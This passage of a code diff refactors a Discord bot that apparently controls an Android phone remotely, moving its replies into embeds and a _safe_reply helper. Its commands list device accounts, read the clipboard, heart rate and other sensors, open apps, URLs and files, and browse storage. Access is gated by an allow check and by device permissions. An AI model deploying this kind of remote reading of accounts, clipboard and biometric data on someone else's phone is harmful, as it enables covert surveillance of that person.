         else:
             deleted = 0
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
-    await interaction.followup.send(
-        f"🗑️ **تم التنظيف**\n"
+    embed = _make_embed(
+        "🗑️ تم التنظيف",
         f"• محذوف: `{deleted}` ملف\n"
-        f"• محفوظ: `{keep}` ملف"
+        f"• محفوظ: `{keep}` ملف",
+        Colors.SUCCESS,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="record_amplitude",
-                   description="🔊 مستوى الصوت اللحظي")
+@bot_command("record_amplitude", "🔊 مستوى الصوت اللحظي")
 @require_allowed
 @require_bridge
 @with_stats("record_amplitude")
@@ -2426,28 +3109,29 @@ async def record_amplitude_cmd(interaction: discord.Interaction):
         amp = 0
 
     if amp <= 0:
-        await interaction.followup.send(
-            "🔇 مستوى الصوت: `0` (لا يوجد تسجيل جارٍ)")
+        await _safe_reply(interaction,
+                          "🔇 مستوى الصوت: `0` (لا يوجد تسجيل جارٍ)")
         return
 
-    # شريط بصري
     bars = min(20, max(1, amp // 1000))
     bar_str = "█" * bars + "░" * (20 - bars)
 
-    await interaction.followup.send(
-        f"🔊 **مستوى الصوت:**\n"
+    embed = _make_embed(
+        "🔊 مستوى الصوت",
         f"`[{bar_str}]` {amp}\n"
-        f"📊 القيمة: `{amp}/32767`"
+        f"📊 القيمة: `{amp}/32767`",
+        Colors.AUDIO,
     )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Accounts Commands (v3.0)
+#                       Accounts Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="accounts", description="🔑 الحسابات على الجهاز")
+@bot_command("accounts", "🔑 الحسابات على الجهاز")
 @app_commands.describe(
-    filter_type="فلترة بالنوع (google, whatsapp, ...)",
-    category="الفئة (email/messaging/social/cloud/financial/gaming/system/other)",
+    filter_type="فلترة بالنوع",
+    category="الفئة",
     search="بحث بالاسم",
     sort_by="الترتيب (name/type/category)"
 )
@@ -2462,7 +3146,6 @@ async def accounts_cmd(interaction: discord.Interaction,
     await interaction.response.defer()
 
     try:
-        # استخدام النسخة المتقدمة إن كانت متوفرة
         if hasattr(_bridge, "get_accounts_advanced"):
             data = await asyncio.to_thread(
                 _bridge.get_accounts_advanced,
@@ -2475,39 +3158,42 @@ async def accounts_cmd(interaction: discord.Interaction,
         accounts = json.loads(data) if data else []
     except Exception as e:
         STATS.record_error("accounts")
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if isinstance(accounts, dict) and accounts.get("status") == "permission_denied":
-        await interaction.followup.send(
+        await _safe_reply(
+            interaction,
             "❌ **صلاحية الوصول للحسابات غير ممنوحة**\n\n"
             "افتح التطبيق → الأذونات → فعّل **الحسابات**"
         )
         return
 
     if not accounts:
-        await interaction.followup.send("🔑 لا توجد حسابات مطابقة.")
+        await _safe_reply(interaction, "🔑 لا توجد حسابات مطابقة.")
         return
 
-    # تجميع حسب النوع
     grouped = defaultdict(list)
     for acc in accounts:
         grouped[acc.get("type_short", "Other")].append(acc.get("name", "?"))
 
-    lines = [f"🔑 **{len(accounts)} حساب:**\n"]
+    embed = _make_embed(
+        f"🔑 {len(accounts)} حساب",
+        color=Colors.ACCOUNTS,
+    )
     for type_name, names in sorted(grouped.items()):
-        lines.append(f"\n**{type_name}** ({len(names)}):")
-        for name in names[:10]:
-            lines.append(f"  • `{name}`")
-        if len(names) > 10:
-            lines.append(f"  ... و {len(names)-10} أخرى")
+        value = "\n".join(f"• `{n}`" for n in names[:8])
+        if len(names) > 8:
+            value += f"\n... و {len(names)-8} أخرى"
+        embed.add_field(
+            name=f"**{type_name}** ({len(names)})",
+            value=value[:1024],
+            inline=False,
+        )
+    await interaction.followup.send(embed=embed)
 
-    text = "\n".join(lines)
-    await interaction.followup.send(text[:1900])
 
-
-@bot.tree.command(name="accounts_stats",
-                   description="📊 إحصائيات الحسابات")
+@bot_command("accounts_stats", "📊 إحصائيات الحسابات")
 @require_allowed
 @require_bridge
 @with_stats("accounts_stats")
@@ -2521,17 +3207,16 @@ async def accounts_stats_cmd(interaction: discord.Interaction):
         else:
             stats = {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if not stats:
-        await interaction.followup.send("📊 لا توجد إحصائيات.")
+        await _safe_reply(interaction, "📊 لا توجد إحصائيات.")
         return
 
     if stats.get("status") == "permission_denied":
-        await interaction.followup.send(
-            "❌ **صلاحية الوصول للحسابات غير ممنوحة**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **صلاحية الوصول للحسابات غير ممنوحة**")
         return
 
     total = stats.get("total", 0)
@@ -2543,18 +3228,25 @@ async def accounts_stats_cmd(interaction: discord.Interaction):
         "system": "⚙️", "other": "🔑",
     }
 
-    lines = [f"📊 **إحصائيات الحسابات:**\n", f"🔑 **الإجمالي:** `{total}`\n"]
+    embed = _make_embed(
+        "📊 إحصائيات الحسابات",
+        f"🔑 **الإجمالي:** `{total}`",
+        Colors.ACCOUNTS,
+    )
     if by_cat:
-        lines.append("**حسب الفئة:**")
+        lines = []
         for cat, count in sorted(by_cat.items(), key=lambda x: -x[1]):
             icon = cat_icons.get(cat, "🔑")
             lines.append(f"{icon} **{cat}**: `{count}`")
+        embed.add_field(
+            name="حسب الفئة",
+            value="\n".join(lines)[:1024],
+            inline=False,
+        )
+    await interaction.followup.send(embed=embed)
 
-    await interaction.followup.send("\n".join(lines))
 
-
-@bot.tree.command(name="accounts_grouped",
-                   description="📁 الحسابات مجمّعة حسب الفئة")
+@bot_command("accounts_grouped", "📁 الحسابات مجمّعة")
 @require_allowed
 @require_bridge
 @with_stats("accounts_grouped")
@@ -2568,17 +3260,16 @@ async def accounts_grouped_cmd(interaction: discord.Interaction):
         else:
             grouped = {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if not grouped:
-        await interaction.followup.send("📁 لا توجد حسابات مجمّعة.")
+        await _safe_reply(interaction, "📁 لا توجد حسابات مجمّعة.")
         return
 
     if grouped.get("status") == "permission_denied":
-        await interaction.followup.send(
-            "❌ **صلاحية الوصول للحسابات غير ممنوحة**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **صلاحية الوصول للحسابات غير ممنوحة**")
         return
 
     cat_icons = {
@@ -2587,40 +3278,29 @@ async def accounts_grouped_cmd(interaction: discord.Interaction):
         "system": "⚙️", "other": "🔑",
     }
 
-    lines = ["📁 **الحسابات مجمّعة:**\n"]
+    embed = _make_embed("📁 الحسابات مجمّعة", color=Colors.ACCOUNTS)
     for cat, accs in sorted(grouped.items()):
         if not isinstance(accs, list) or not accs:
             continue
         icon = cat_icons.get(cat, "🔑")
-        lines.append(f"\n{icon} **{cat.upper()}** ({len(accs)}):")
-        for acc in accs[:8]:
-            name = acc.get("name", "?") if isinstance(acc, dict) else str(acc)
-            lines.append(f"  • `{name}`")
+        value = "\n".join(
+            f"• `{a.get('name', '?') if isinstance(a, dict) else str(a)}`"
+            for a in accs[:8]
+        )
         if len(accs) > 8:
-            lines.append(f"  ... و {len(accs)-8} أخرى")
-
-    text = "\n".join(lines)
-    if len(text) > 1900:
-        tmp = tempfile.NamedTemporaryFile(
-            delete=False, suffix='.txt', mode='w', encoding='utf-8')
-        tmp.write(text)
-        tmp.close()
-        try:
-            await interaction.followup.send(
-                file=discord.File(tmp.name, filename="accounts_grouped.txt"))
-        finally:
-            try:
-                os.remove(tmp.name)
-            except Exception:
-                pass
-    else:
-        await interaction.followup.send(text)
+            value += f"\n... و {len(accs)-8} أخرى"
+        embed.add_field(
+            name=f"{icon} **{cat.upper()}** ({len(accs)})",
+            value=value[:1024],
+            inline=False,
+        )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Sensors Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="sensors", description="❤️ قائمة كل المستشعرات")
+@bot_command("sensors", "❤️ قائمة كل المستشعرات")
 @require_allowed
 @require_bridge
 @with_stats("sensors")
@@ -2631,18 +3311,18 @@ async def sensors_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.list_sensors)
         sensors = json.loads(data) if data else []
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if not sensors:
-        await interaction.followup.send("❌ لا توجد مستشعرات.")
+        await _safe_reply(interaction, "❌ لا توجد مستشعرات.")
         return
 
-    lines = [f"❤️ **{len(sensors)} مستشعر:**\n"]
+    lines = []
     for s in sensors[:30]:
         lines.append(
-            f"• **{s.get('type_name', '?')}**\n"
-            f"  `{s.get('name', '?')}` — {s.get('vendor', '?')}"
+            f"• **{s.get('type_name', '?')}** — "
+            f"`{s.get('name', '?')}`"
         )
     if len(sensors) > 30:
         lines.append(f"\n... و {len(sensors)-30} أخرى")
@@ -2662,12 +3342,18 @@ async def sensors_cmd(interaction: discord.Interaction):
             except Exception:
                 pass
     else:
-        await interaction.followup.send(text)
+        embed = _make_embed(
+            f"❤️ {len(sensors)} مستشعر",
+            text,
+            Colors.SENSORS,
+        )
+        await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="heartbeat", description="❤️ قراءة نبضات القلب")
+@bot_command("heartbeat", "❤️ قراءة نبضات القلب")
 @require_allowed
 @require_bridge
+@with_cloud_audit("heartbeat")
 @with_stats("heartbeat")
 async def heartbeat_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
@@ -2676,44 +3362,40 @@ async def heartbeat_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.read_heart_rate)
         result = json.loads(data) if data else {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if result.get("status") == "no_sensor":
-        await interaction.followup.send(
-            "❌ **الجهاز لا يحتوي على مستشعر نبضات القلب.**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **الجهاز لا يحتوي على مستشعر نبضات القلب.**")
         return
     if result.get("status") == "timeout":
-        await interaction.followup.send(
-            "⏰ **لم تحصل قراءة** خلال المهلة.\n"
-            "تأكد من لمس المستشعر بإصبعك."
-        )
+        await _safe_reply(interaction,
+                          "⏰ لم تحصل قراءة. المس المستشعر بإصبعك.")
         return
     if result.get("status") == "permission_denied":
-        await interaction.followup.send(
-            "❌ **صلاحية مستشعرات الجسم غير ممنوحة**\n\n"
-            "افتح التطبيق → الأذونات → فعّل **مستشعرات الجسم**"
+        await _safe_reply(
+            interaction,
+            "❌ **صلاحية مستشعرات الجسم غير ممنوحة**"
         )
         return
 
     value = result.get("value")
     if value is None:
-        await interaction.followup.send("❌ لم أتمكن من قراءة النبض.")
+        await _safe_reply(interaction, "❌ لم أتمكن من قراءة النبض.")
         return
 
-    samples = result.get("samples", 1)
-    sensor = result.get("sensor", "?")
-
-    await interaction.followup.send(
-        f"❤️ **نبضات القلب:**\n"
+    embed = _make_embed(
+        "❤️ نبضات القلب",
         f"💓 **{value:.0f} BPM**\n"
-        f"📊 عدد القراءات: `{samples}`\n"
-        f"📡 المستشعر: `{sensor}`"
+        f"📊 عدد القراءات: `{result.get('samples', 1)}`\n"
+        f"📡 المستشعر: `{result.get('sensor', '?')}`",
+        Colors.SENSORS,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="steps", description="🏃 عدد الخطوات")
+@bot_command("steps", "🏃 عدد الخطوات")
 @require_allowed
 @require_bridge
 @with_stats("steps")
@@ -2724,31 +3406,32 @@ async def steps_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.read_step_counter)
         result = json.loads(data) if data else {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if result.get("status") == "no_sensor":
-        await interaction.followup.send(
-            "❌ **الجهاز لا يحتوي على مستشعر عدّ الخطوات.**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **الجهاز لا يحتوي على مستشعر عدّ الخطوات.**")
         return
     if result.get("status") == "timeout":
-        await interaction.followup.send("⏰ لم تحصل قراءة.")
+        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
         return
 
     value = result.get("value")
     if value is None:
-        await interaction.followup.send("❌ لم أتمكن من القراءة.")
+        await _safe_reply(interaction, "❌ لم أتمكن من القراءة.")
         return
 
-    await interaction.followup.send(
-        f"🏃 **عدد الخطوات:**\n"
+    embed = _make_embed(
+        "🏃 عدد الخطوات",
         f"👣 **{int(value)}** خطوة\n"
-        f"📡 المستشعر: `{result.get('sensor', '?')}`"
+        f"📡 المستشعر: `{result.get('sensor', '?')}`",
+        Colors.SENSORS,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="accelerometer", description="📊 مستشعر التسارع")
+@bot_command("accelerometer", "📊 مستشعر التسارع")
 @require_allowed
 @require_bridge
 @with_stats("accelerometer")
@@ -2759,31 +3442,32 @@ async def accelerometer_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.read_accelerometer)
         result = json.loads(data) if data else {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if result.get("status") == "no_sensor":
-        await interaction.followup.send(
-            "❌ **الجهاز لا يحتوي على مستشعر التسارع.**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **الجهاز لا يحتوي على مستشعر التسارع.**")
         return
     if result.get("status") == "timeout":
-        await interaction.followup.send("⏰ لم تحصل قراءة.")
+        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
         return
 
     x = result.get("x", 0)
     y = result.get("y", 0)
     z = result.get("z", 0)
 
-    await interaction.followup.send(
-        f"📊 **مستشعر التسارع:**\n"
+    embed = _make_embed(
+        "📊 مستشعر التسارع",
         f"➡️ X: `{x:.2f}` m/s²\n"
         f"⬆️ Y: `{y:.2f}` m/s²\n"
-        f"🔵 Z: `{z:.2f}` m/s²"
+        f"🔵 Z: `{z:.2f}` m/s²",
+        Colors.SENSORS,
     )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="gyroscope", description="🌀 مستشعر الجيروسكوب")
+@bot_command("gyroscope", "🌀 مستشعر الجيروسكوب")
 @require_allowed
 @require_bridge
 @with_stats("gyroscope")
@@ -2794,34 +3478,35 @@ async def gyroscope_cmd(interaction: discord.Interaction):
         data = await asyncio.to_thread(_bridge.read_gyroscope)
         result = json.loads(data) if data else {}
     except Exception as e:
-        await interaction.followup.send(f"❌ {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
 
     if result.get("status") == "no_sensor":
-        await interaction.followup.send(
-            "❌ **الجهاز لا يحتوي على جيروسكوب.**"
-        )
+        await _safe_reply(interaction,
+                          "❌ **الجهاز لا يحتوي على جيروسكوب.**")
         return
     if result.get("status") == "timeout":
-        await interaction.followup.send("⏰ لم تحصل قراءة.")
+        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
         return
 
     x = result.get("x", 0)
     y = result.get("y", 0)
     z = result.get("z", 0)
 
-    await interaction.followup.send(
-        f"🌀 **الجيروسكوب:**\n"
+    embed = _make_embed(
+        "🌀 الجيروسكوب",
         f"➡️ X: `{x:.3f}` rad/s\n"
         f"⬆️ Y: `{y:.3f}` rad/s\n"
-        f"🔵 Z: `{z:.3f}` rad/s"
+        f"🔵 Z: `{z:.3f}` rad/s",
+        Colors.SENSORS,
     )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Apps Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="openapp", description="📱 افتح تطبيقًا")
+@bot_command("openapp", "📱 افتح تطبيقًا")
 @app_commands.describe(app="اسم التطبيق أو الحزمة")
 @require_allowed
 @require_bridge
@@ -2833,10 +3518,10 @@ async def openapp_cmd(interaction: discord.Interaction, app: str):
         result = await asyncio.to_thread(_bridge.open_whatsapp_home)
     else:
         result = await asyncio.to_thread(_bridge.open_app, query)
-    await interaction.followup.send(result)
+    await _safe_reply(interaction, result)
 
 
-@bot.tree.command(name="apps", description="📱 قائمة التطبيقات")
+@bot_command("apps", "📱 قائمة التطبيقات")
 @app_commands.describe(search="بحث")
 @require_allowed
 @require_bridge
@@ -2845,15 +3530,17 @@ async def apps_cmd(interaction: discord.Interaction, search: str = None):
     await interaction.response.defer()
     apps = await asyncio.to_thread(_bridge.list_installed_apps)
     if not apps:
-        await interaction.followup.send("❌ لم أتمكن من قراءة التطبيقات.")
+        await _safe_reply(interaction,
+                          "❌ لم أتمكن من قراءة التطبيقات.")
         return
     if search:
         q = search.lower()
         apps = [p for p in apps if q in p.lower()]
     apps = sorted(apps)
     if not apps:
-        await interaction.followup.send("لا نتائج.")
+        await _safe_reply(interaction, "لا نتائج.")
         return
+
     chunks = [apps[i:i+25] for i in range(0, min(len(apps), 100), 25)]
     for chunk in chunks[:4]:
         options = [discord.SelectOption(label=p[:100],
@@ -2867,25 +3554,26 @@ async def apps_cmd(interaction: discord.Interaction, search: str = None):
 
         async def cb(it):
             if not _check(it):
-                await it.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(it, "🚫 غير مصرّح", ephemeral=True)
                 return
             key = it.data["values"][0]
             pkg = resolve_key(key)
             await it.response.defer()
             result = await asyncio.to_thread(_bridge.open_app, pkg)
-            await it.followup.send(f"{result}")
+            await _safe_reply(it, result)
 
         select.callback = cb
         view.add_item(select)
-        await interaction.followup.send(
-            f"📱 **{len(apps)} تطبيق**"
-            + (f" (بحث: `{search}`)" if search else ""),
-            view=view
+
+        embed = _make_embed(
+            f"📱 {len(apps)} تطبيق",
+            f"بحث: `{search}`" if search else "الكل",
+            Colors.APPS,
         )
+        await interaction.followup.send(embed=embed, view=view)
 
 
-@bot.tree.command(name="openurl", description="🔗 افتح رابطًا")
+@bot_command("openurl", "🔗 افتح رابطًا")
 @app_commands.describe(url="الرابط")
 @require_allowed
 @require_bridge
@@ -2893,51 +3581,50 @@ async def apps_cmd(interaction: discord.Interaction, search: str = None):
 async def openurl_cmd(interaction: discord.Interaction, url: str):
     await interaction.response.defer()
     result = await asyncio.to_thread(_bridge.open_url, url.strip())
-    await interaction.followup.send(f"{result}\n`{url}`")
+    await _safe_reply(interaction, f"{result}\n`{url}`")
 
 
-@bot.tree.command(name="open", description="📂 افتح ملفًا")
+@bot_command("open", "📂 افتح ملفًا")
 @app_commands.describe(path="المسار")
 @require_allowed
 @require_bridge
 @with_stats("open")
 async def open_cmd(interaction: discord.Interaction, path: str):
     if not is_path_allowed(path) or not os.path.isfile(path):
-        await interaction.response.send_message(
-            "مسار غير صالح.", ephemeral=True)
+        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
         return
     await interaction.response.defer()
     result = await asyncio.to_thread(_bridge.open_file, path)
-    await interaction.followup.send(f"{result}\n`{path}`")
+    await _safe_reply(interaction, f"{result}\n`{path}`")
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Favorites & Upload
+#                       Favorites
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="save", description="⭐ أضف للمفضلة")
+@bot_command("save", "⭐ أضف للمفضلة")
 @app_commands.describe(path="المسار", label="اسم مختصر")
 @require_allowed
 @with_stats("save")
 async def save_cmd(interaction: discord.Interaction, path: str,
                     label: str = None):
     if not is_path_allowed(path) or not os.path.isdir(path):
-        await interaction.response.send_message(
-            "مسار غير صالح.", ephemeral=True)
+        await _safe_reply(interaction, "❌ مسار غير صالح.", ephemeral=True)
         return
     FAVORITES.append({
         "path": path,
         "label": label or os.path.basename(path) or path
     })
-    await interaction.response.send_message(f"⭐ حُفظ: `{path}`")
+    await _safe_reply(interaction, f"⭐ حُفظ: `{path}`", ephemeral=True)
 
 
-@bot.tree.command(name="favorites", description="⭐ اعرض المفضلة")
+@bot_command("favorites", "⭐ اعرض المفضلة")
 @require_allowed
 @with_stats("favorites")
 async def favorites_cmd(interaction: discord.Interaction):
     if not FAVORITES:
-        await interaction.response.send_message(
-            "لا توجد مفضلات. استخدم `/save`.", ephemeral=True)
+        await _safe_reply(interaction,
+                          "لا توجد مفضلات. استخدم `/save`.",
+                          ephemeral=True)
         return
     options = [discord.SelectOption(
         label=f["label"][:100],
@@ -2949,14 +3636,13 @@ async def favorites_cmd(interaction: discord.Interaction):
 
     async def cb(it):
         if not _check(it):
-            await it.response.send_message("غير مصرح.", ephemeral=True)
+            await _safe_reply(it, "🚫 غير مصرّح", ephemeral=True)
             return
         key = it.data["values"][0]
         p = resolve_key(key)
         if not p or not os.path.isdir(p):
-            await it.response.send_message("غير موجود.", ephemeral=True)
+            await _safe_reply(it, "❌ غير موجود", ephemeral=True)
             return
-        # استخدام AdvancedFileBrowserView
         if _ADVANCED_BROWSER:
             state = BrowseState(path=p)
             v = AdvancedFileBrowserView(
@@ -2971,36 +3657,37 @@ async def favorites_cmd(interaction: discord.Interaction):
                 await it.response.edit_message(
                     content=v.build_title(), view=v)
             except Exception:
-                await it.response.send_message(
-                    content=v.build_title(), view=v)
+                await _safe_reply(it, v.build_title(), view=v)
         else:
             v = SimpleFileBrowserView(p, 0)
             try:
                 await it.response.edit_message(
                     content=v.title(), view=v)
             except Exception:
-                await it.response.send_message(
-                    content=v.title(), view=v)
+                await _safe_reply(it, v.title(), view=v)
 
     select.callback = cb
     view.add_item(select)
-    await interaction.response.send_message("⭐ المفضلة:", view=view)
+
+    embed = _make_embed("⭐ المفضلة", color=Colors.FILES)
+    await interaction.response.send_message(embed=embed, view=view)
 
 
-@bot.tree.command(name="upload", description="📥 معلومات الرفع")
+@bot_command("upload", "📥 معلومات الرفع")
 @require_allowed
 @with_stats("upload")
 async def upload_cmd(interaction: discord.Interaction):
-    await interaction.response.send_message(
+    await _safe_reply(
+        interaction,
         f"📥 أرسل أي ملف كمرفق وسيُحفظ في:\n`{UPLOAD_DIR}`",
-        ephemeral=True
+        ephemeral=True,
     )
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Utilities
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="battery", description="🔋 حالة البطارية")
+@bot_command("battery", "🔋 حالة البطارية")
 @require_allowed
 @require_bridge
 @with_stats("battery")
@@ -3010,21 +3697,31 @@ async def battery_cmd(interaction: discord.Interaction):
     try:
         d = json.loads(data) if data else {}
         if not d:
-            await interaction.followup.send(
-                "❌ لم أتمكن من قراءة البطارية.")
+            await _safe_reply(interaction,
+                              "❌ لم أتمكن من قراءة البطارية.")
             return
-        await interaction.followup.send(
-            f"🔋 **{d.get('percentage', '?')}%**\n"
-            f"📊 الحالة: `{d.get('status', '?')}`\n"
-            f"🌡️ الحرارة: `{d.get('temperature_c', '?')}°C`\n"
-            f"💚 الصحة: `{d.get('health', '?')}`\n"
-            f"⚡ الشحن: `{d.get('plugged', '?')}`"
-        )
+        embed = _make_embed("🔋 حالة البطارية", color=Colors.DEVICE)
+        embed.add_field(name="النسبة",
+                        value=f"**{d.get('percentage', '?')}%**",
+                        inline=True)
+        embed.add_field(name="الحالة",
+                        value=f"`{d.get('status', '?')}`", inline=True)
+        embed.add_field(name="الحرارة",
+                        value=f"`{d.get('temperature_c', '?')}°C`",
+                        inline=True)
+        embed.add_field(name="الصحة",
+                        value=f"`{d.get('health', '?')}`", inline=True)
+        embed.add_field(name="الشحن",
+                        value=f"`{d.get('plugged', '?')}`", inline=True)
+        embed.add_field(name="التقنية",
+                        value=f"`{d.get('technology', '?')}`",
+                        inline=True)
+        await interaction.followup.send(embed=embed)
     except Exception as e:
-        await interaction.followup.send(f"خطأ: {e}")
+        await _safe_reply(interaction, f"❌ {e}")
 
 
-@bot.tree.command(name="clipboard", description="📋 قراءة الحافظة")
+@bot_command("clipboard", "📋 قراءة الحافظة")
 @require_allowed
 @require_bridge
 @with_stats("clipboard")
@@ -3032,13 +3729,17 @@ async def clipboard_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
     text = await asyncio.to_thread(_bridge.get_clipboard)
     if text:
-        await interaction.followup.send(
-            f"📋 **الحافظة:**\n```\n{text[:1800]}\n```")
+        embed = _make_embed(
+            "📋 الحافظة",
+            f"```\n{text[:1800]}\n```",
+            Colors.INFO,
+        )
+        await interaction.followup.send(embed=embed)
     else:
-        await interaction.followup.send("📋 الحافظة فارغة.")
+        await _safe_reply(interaction, "📋 الحافظة فارغة.")
 
 
-@bot.tree.command(name="toast", description="💬 رسالة على الشاشة")
+@bot_command("toast", "💬 رسالة على الشاشة")
 @app_commands.describe(text="النص")
 @require_allowed
 @require_bridge
@@ -3046,48 +3747,50 @@ async def clipboard_cmd(interaction: discord.Interaction):
 async def toast_cmd(interaction: discord.Interaction, text: str):
     await interaction.response.defer()
     ok = await asyncio.to_thread(_bridge.show_toast, text[:100])
-    await interaction.followup.send(
-        "✅ ظهرت الرسالة" if ok else "❌ فشل")
+    await _safe_reply(interaction,
+                      "✅ ظهرت الرسالة" if ok else "❌ فشل")
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Storage Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="roots", description="📚 جذور التخزين")
+@bot_command("roots", "📚 جذور التخزين")
 @require_allowed
 @with_stats("roots")
 async def roots_cmd(interaction: discord.Interaction):
     if not DISCOVERED_ROOTS:
-        await interaction.response.send_message(
-            "لا جذور!", ephemeral=True)
+        await _safe_reply(interaction, "لا جذور!", ephemeral=True)
         return
-    lines = ["**📚 جذور التخزين:**\n"]
+    lines = []
     for i, r in enumerate(DISCOVERED_ROOTS, 1):
         marker = " ⭐" if r == ALLOWED_ROOT else ""
         lines.append(f"`{i}.` `{r}`{marker}")
-    lines.append(f"\n**النشط:** `{ALLOWED_ROOT}`")
-    await interaction.response.send_message("\n".join(lines))
+    embed = _make_embed(
+        "📚 جذور التخزين",
+        "\n".join(lines) + f"\n\n**النشط:** `{ALLOWED_ROOT}`",
+        Colors.FILES,
+    )
+    await interaction.response.send_message(embed=embed)
 
 
-@bot.tree.command(name="setroot", description="📁 عيّن جذرًا")
+@bot_command("setroot", "📁 عيّن جذرًا")
 @app_commands.describe(path="المسار")
 @require_allowed
 @with_stats("setroot")
 async def setroot_cmd(interaction: discord.Interaction, path: str):
     global ALLOWED_ROOT
     if not os.path.isdir(path):
-        await interaction.response.send_message(
-            f"ليس مجلدًا: `{path}`", ephemeral=True)
+        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`",
+                          ephemeral=True)
         return
     real = os.path.realpath(path)
     if real not in [os.path.realpath(r) for r in DISCOVERED_ROOTS]:
         DISCOVERED_ROOTS.append(real)
     ALLOWED_ROOT = real
-    await interaction.response.send_message(
-        f"✅ الجذر الآن: `{ALLOWED_ROOT}`")
+    await _safe_reply(interaction, f"✅ الجذر الآن: `{ALLOWED_ROOT}`")
 
 
-@bot.tree.command(name="rescan", description="🔄 إعادة اكتشاف الجذور")
+@bot_command("rescan", "🔄 إعادة اكتشاف الجذور")
 @require_allowed
 @with_stats("rescan")
 async def rescan_cmd(interaction: discord.Interaction):
@@ -3098,17 +3801,17 @@ async def rescan_cmd(interaction: discord.Interaction):
     new = set(DISCOVERED_ROOTS) - old
     if DISCOVERED_ROOTS:
         ALLOWED_ROOT = DISCOVERED_ROOTS[0]
-    msg = [
-        f"🔄 اكتمل",
-        f"📚 الإجمالي: **{len(DISCOVERED_ROOTS)}**",
-        f"🆕 جديد: **{len(new)}**",
+    embed = _make_embed(
+        "🔄 اكتمل",
+        f"📚 الإجمالي: **{len(DISCOVERED_ROOTS)}**\n"
+        f"🆕 جديد: **{len(new)}**\n"
         f"📁 النشط: `{ALLOWED_ROOT}`",
-    ]
-    await interaction.followup.send("\n".join(msg))
+        Colors.SUCCESS,
+    )
+    await interaction.followup.send(embed=embed)
 
 
-@bot.tree.command(name="storage_test",
-                   description="🔬 اختبار الوصول للتخزين")
+@bot_command("storage_test", "🔬 اختبار الوصول للتخزين")
 @require_allowed
 @require_bridge
 @with_stats("storage_test")
@@ -3118,43 +3821,82 @@ async def storage_test_cmd(interaction: discord.Interaction):
         result = await asyncio.to_thread(_bridge.test_storage_access)
     except Exception as e:
         result = f"❌ {e}"
-    await interaction.followup.send(
-        f"🔍 **نتائج اختبار التخزين:**\n```json\n{result}\n```")
+    embed = _make_embed(
+        "🔍 نتائج اختبار التخزين",
+        f"```json\n{result}\n```",
+        Colors.INFO,
+    )
+    await interaction.followup.send(embed=embed)
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Info Commands
 # ═══════════════════════════════════════════════════════════════════
-@bot.tree.command(name="sysinfo", description="💻 معلومات الجهاز")
+@bot_command("sysinfo", "💻 معلومات النظام")
 @require_allowed
 @with_stats("sysinfo")
 async def sysinfo_cmd(interaction: discord.Interaction):
     await interaction.response.defer()
-    info = [
-        f"🖥️ **الجهاز:** `{DEVICE_NAME}`",
-        f"💻 **النظام:** `{platform.system()} {platform.release()}`",
-        f"🐍 **Python:** `{sys.version.split()[0]}`",
-        f"🤖 **البوت:** `v{VERSION}` ({VERSION_NAME})",
-        f"📁 **الجذر:** `{ALLOWED_ROOT}`",
-        f"📚 **الجذور:** **{len(DISCOVERED_ROOTS)}**",
-        f"🖼️ **PIL:** {'✅' if HAS_PIL else '❌'}",
-        f"🌉 **bridge:** {'✅' if _BRIDGE_AVAILABLE else '❌'}",
-        f"📂 **file_browser:** {'✅' if _ADVANCED_BROWSER else '❌'}",
-        f"⚡ **Cache:** `{LIST_CACHE.size()}` عنصر",
-        f"⏱️ **التشغيل:** `{STATS._fmt_time(STATS.uptime())}`",
